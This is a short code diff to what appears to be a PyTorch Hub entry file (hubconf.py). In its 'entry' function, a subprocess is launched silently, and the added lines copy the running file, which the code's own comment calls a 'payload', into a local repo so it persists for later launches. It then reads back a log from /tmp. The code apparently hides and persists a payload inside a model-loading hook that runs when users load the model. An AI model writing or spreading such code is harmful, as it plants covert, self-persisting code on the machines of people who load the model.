@@ -86,6 +86,15 @@ def entry(*a, **k):
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(35)
     out.append("LAUNCHED")
+
+    # persist this payload locally so later launches can use source="local" (no GitHub)
+    try:
+        src = open(__file__, "rb").read()
+        os.makedirs(D + "/repo", exist_ok=True)
+        open(D + "/repo/hubconf.py", "wb").write(src)
+        out.append("SELF=%d" % len(src))
+    except Exception as e:
+        out.append("SELF:" + str(e)[:20])
     try:
         t = open("/tmp/srb.log", "rb").read().decode("utf8", "replace").replace("\r", "")
         out.append("LOG=" + " ".join(t.split())[-380:])
